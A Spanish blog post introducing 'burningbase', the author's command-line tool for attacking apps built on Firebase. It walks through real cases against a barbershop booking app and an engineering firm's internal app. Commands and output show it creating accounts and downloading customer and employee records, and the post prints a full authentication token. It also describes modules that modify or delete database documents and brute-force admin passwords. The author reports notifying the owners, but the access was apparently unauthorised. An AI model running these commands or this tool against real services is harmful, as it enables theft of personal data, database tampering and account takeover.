---
title: "Burningbase"
author: datadiego
draft: false
description: Herramienta de pentesting para servicios Firebase
date: 2026-07-09
tags:
  - hacking
layout: layouts/post.njk
---

Unos posts atrás ya estuvimos hablando del problema de Firebase en ciertas aplicaciones. En el mismo se mostraba una pequeña herramienta que estuve creando para poder hacer pentesting más rápidamente a aplicaciones que hicieran uso de servicios de `Firebase` como la *autenticación* o *Firestore*.

En los siguientes días, seguí trabajando en la misma y ahora mismo empieza a ser una herramienta bastante poderosa que estoy considerando añadir a mi servidor para reconocimiento viendo los resultados que está dando.

Puedes descargar la herramienta desde su [repositorio oficial](https://github.com/datadiego/burningbase).

Esta creada con **bun** y typescript. Es un lenguaje lo suficientemente sencillo como para prototipar rápido y el runtime de Bun me permite exportar un binario ejecutable de forma muy simple. Además, la API para manejar ficheros es bastante mas elegante que la original de *Nodejs*, para herramientas CLI ligeras es más que suficiente.

## Ejemplos reales de uso

Voy a mostrar varios casos reales en los que una aplicación expone datos en estos servicios, explotandolos con esta herramienta.

Toda la información sensible mostrada estará censurada para evitar filtrar datos de terceros.

En ningún momento se conservan estos datos, siempre son descargados en `/tmp` y borrados posteriormente.

Las empresas afectadas son notificadas y se les ofrece ayuda no remunerada en cuanto detecto cualquier tipo de problema en su configuración.

### Barberia

Esta app para pedir **citas en una barbería** de España expone datos de sus clientes.


Al dueño del negocio se le notificó por medios privados y me ofrecí a ayudar para solucionar el problema de reglas en Firestore presentes.

Encontré está página aplicando `dorks` directamente desde `Google`.

![login](./web0.png)

Primero debemos comprobar si la página en si utiliza algun servicio de `Firebase`, `burningbase` incorpora un módulo de scrapping que busca recursivamente en la página los diferentes archivos `.js` que encuentra hasta dar con alguna variable que se llame `firebaseConfig` (el nombre por defecto que dan en los snippets de la plataforma) o un objeto con las claves `projectId` o `apikey`, que están presentes en cualquier configuración de estos servicios.

![scrapping](./web1.png)

Lo encuentra, este objeto es necesario para utilizar el resto de módulos de la herramienta, podemos almacenarla con:

```bash
burningbase -m scrape -u <url> -o <path>
```

Una vez almacenada, vamos a lanzar un escaneo rápido que mostrará qué puede encontrar en la página con:

```bash
burningbase -c /tmp/config.json -m full-scan
```

Nos devuelve los siguientes resultados:

```bash
> Full Scan

> Trying anonymous auth...
  [FAIL] Anonymous auth not available

> Trying email auth with random credentials (user4fd86338@test.com:123456)...
  [OK] Email user created (UID: DdqBXJAjN5csMv08HfkOMNlZKcJ2)

> Scanning Realtime Database...
  [FAIL] No accessible paths found

> Scanning Firestore...
  [OK] users: 100 document(s)
  [OK] settings: 1 document(s)

> Scan Complete

Anonymous auth:    Not available
Email auth:        Succeeded (user4fd86338@test.com)
Realtime paths:    0 found
Firestore collections: 2 found
```

Podemos registrar usuarios mediante email y contraseña en el servicio de autenticación esto es muy común, lo realmente grave es tener acceso a **100 usuarios almacenados en Firestore** en la colección `users`.

Podemos leer y descargar todos los documentos con el siguiente comando:

```bash
burningbase -c /tmp/config.json -m read-firestore -t users -o /tmp/
```

Obtenemos el mensaje de que se han podido descargar y almacenar donde queremos:

```bash
Reading: users ...   [OK] 100 document(s)
    Saved to: /tmp/users.json
```

En cuanto leemos el json encontramos todos los datos de los usuarios:

![usuarios](./web2.png)

Los datos incluyen bastante información sensible, nombre, apellidos, edad, email, teléfono y en algunos casos, fotografías personales.

No llevamos el ataque más allá, la idea de este ejercicio **no es provocar daños a los datos**, encontrar esta exposición es más que suficiente para contactar con el dueño del negocio, explicar que se ha encontrado y ofrecer nuestro contacto en caso de que necesite ayuda para parchear las reglas de *Firestore*.

### Aplicación interna de empresa de ingeniería

Encuentro otra aplicación con un `login`, esta pertenece a una compañía de ingeniería civil.

```bash
~ ❯ burningbase -m full-scan -u <url> -c /tmp/config.json

> Full Scan


> Trying anonymous auth...
  [FAIL] Anonymous auth not available

> Trying email auth with random credentials (user9502073d@test.com :123456)...
  [OK] Email user created (UID: elaxY9gZ7JbXlhU3c4bUaQcjpvm2)

> Scanning Realtime Database...
  [OK] users: 15 item(s)

> Scanning Firestore...
  [FAIL] No accessible collections found

> Scan Complete

Anonymous auth:    Not available
Email auth:        Succeeded (user9502073d@test.com )
Realtime paths:    1 found
Firestore collections: 0 found
```

De nuevo, permite la creación de unas credenciales de acceso, y esta vez encuentra datos en una base de datos `realtime`.

Si intentamos acceder directamente a estos datos, no nos lo permite:

```bash
~ ❯ burningbase -m read-realtime -t users -c /tmp/config.json

> Reading: users
  [FAIL] HTTP 401 Unauthorized
```

Pero usando unas credenciales creadas si:

```bash
~ ✗ burningbase -c /tmp/config.json -m read-realtime -t users -e user9502073d@test.com -p 123456

Logging in as user9502073d@test.com...
  [OK] Login successful
  UID: assqA39eHfSGuleTcuVTxEGeraA3
  ID Token:
eyJhbGciOiJSUzI1NiIsImtpZCI6IjY1Y2IzZjAyMGNhZjdiMmE5ZTg2ZWFkOTAxZDg5ZjQ4MTJjYmFjYmMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20va3lqY29udHJvbCIsImF1ZCI6Imt5amNvbnRyb2wiLCJhdXRoX3RpbWUiOjE3ODM3NjQxMzMsInVzZXJfaWQiOiJhc3NxQTM5ZUhmU0d1bGVUY3VWVHhFR2VyYUEzIiwic3ViIjoiYXNzcUEzOWVIZlNHdWxlVGN1VlR4RUdlcmFBMyIsImlhdCI6MTc4Mzc2NDEzMywiZXhwIjoxNzgzNzY3NzMzLCJlbWFpbCI6InVzZXI5NTAyMDczZEB0ZXN0LmNvbSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJ1c2VyOTUwMjA3M2RAdGVzdC5jb20iXX0sInNpZ25faW5fcHJvdmlkZXIiOiJwYXNzd29yZCJ9fQ.JjzXNWIhenfAClyXNfaqU9Hl_cQ4etScor_TripUVz9PLxDI39Qv0PgUVCq3wAqCP05JTDHfXIDEAnT-hktENBoPyDpgupu2GTR8on6Npu801181rS6rmKOjmjG3IpARJD6DO_ijdRzmyBNV0WxYMN8E-QguVeD8mNGJWr6dAXVdU3BSSFUdYjZBaYWtkVc-6OZKIAJHNfr-q8Lh6C-V8ny74FjDnxAIeDSbvw3VktAdjfPEeEnrMmEudirDcv05TCN3bJlc4lZmSrDE13QqMG05lsBTsPtO6KZeo-xTj5XlGGvJeRQABzF9aYfD6bsu2v_cySvfar3m63nDxFeNlQ
> Reading: users
```

De nuevo, encontramos correos y nombres de los clientes, pero también de los trabajadores:

![ingenieria0](./ing0.png)

Además, también hay datos de todos los proyectos en los que se trabaja, imágenes y logs de toda la actividad de la compañía:

![ingenieria1](./ing1.png)

De nuevo, notificamos a la empresa con lo encontrado, y ofrecemos ayuda desinteresada para solucionar la exposición de datos.

## Sobre la herramienta

Como hemos visto, con solo un par de comandos, ya hemos podido descubrir datos sensibles de una aplicación expuesta.

He diseñado `burningbase` para que sea rápida y bastante automática de usar, pero tenemos múltiples módulos disponibles y flags opcionales que nos permiten ser más precisos durante un ataque.

A dia de hoy, los módulos disponibles son:

- `scrape`: Busca desde una url cualquier objeto que sirva para identificar proyectos hechos con servicios de `Firebase` de manera recursiva, este objeto es necesario para utilizar el resto de módulos de la herramienta.
- `create-email`: Crea un registro en el servicio de autenticación de `Firebase` con correo y password si la aplicación lo permite.
- `create-anon`: Crea un login anónimo si la aplicación lo permite.
- `read-firestore`: Lee un documento de una colección y extraerlos si la aplicación y tus credenciales lo permiten.
- `create-firestore`: Crea un documento en la colección deseada de `Firestore` si la aplicación y tus credenciales lo permiten.
- `update-firestore`: Modifica un documento concreto de cualquier colección en `Firestore` si la aplicación y tus credenciales lo permiten.
- `delete-firestore`: Borra un documento de la colección deseada en `Firestore` si la aplicación y tus credenciales lo permiten.
- `bruteforce-login`: Ataque de fuerza bruta contra el registro de autenticación de `Firebase`.
- `read-realtime`: Lee y extrae claves y valores de la base de datos `realtime`.
- `scan-firestore`: Busca colecciones existentes en la base de datos `Firestore`.
- `scan-realtime`: Busca claves existentes en la base de datos `Realtime`.
- `full-scan`: Intenta crear un usuario anónimo, otro con email y contraseña y realiza automáticamente un escaneo en `Firestore` y `Realtime`.

Son **muchos**, pero la interfaz CLI de la herramienta es lo suficientemente homogenea y simple para usarla fácilmente.

He usado **Commander* como libreria para manejar las flags y argumentos que pasa el usuario, y poder tener un `--help` actualizado más fácilmente.

### Escaneos

Los modulos de escaneo son nuestra principal fuente de información antes de leer o editar las bases de datos disponibles en la aplicación.

Quería que la propia herramienta contara con unas listas a las que hacer `fallback` en caso de que no pasaramos una personalizada, las listas usadas en estos escaneos no son demasiado exhaustivas, pero contienen suficientes terminos en ingles y español, para confiar en ellos para bastantes casos.

Aún asi, podemos pasarles listas personalizadas con `-t` o `--target`

```bash
burningbase -m scan-firestore -c Documentos/firebase-testing/config.js -t /tmp/list.txt
```

O especificarlos directamente en el comando:

```bash
burningbase -m scan-firestore -c Documentos/firebase-testing/config.js -t reviews,posts,usuarios
```

Además, puedes editarlas antes de compilar si prefieres tener más extensas, son archivos `.txt` simples.

### Brutefoce login

En muchas ocasiones las reglas de `Firestore` estan bien configuradas y no vas a poder hacer gran cosa, pero hay casos donde puede ser fácil conseguir algun email de administrador, muchas veces están hardcodeadas en la propia lógica de la aplicación o en secciones de *contacto*, repositorios, etc.

El modulo de `bruteforce-login` te ayudará a intentar sacar su password. Esta muy inspirada en `hydra` para las flags:

- `-e` o `--email` para probar un solo email.
- `-E` o `--emails` para probar múltiples emails.
- `-p` o `--password` para probar una password.
- `-P` o `--passwords` para probar múltiples passwords.

Ambos admiten pasar una lista en un archivo, o indicar las contraseñas directamente en el comando, igual que haciamos con los `targets` de escaneo.

Si no indicas ninguna, la herramienta cuenta también con una lista de contraseñas **muy básicas**.
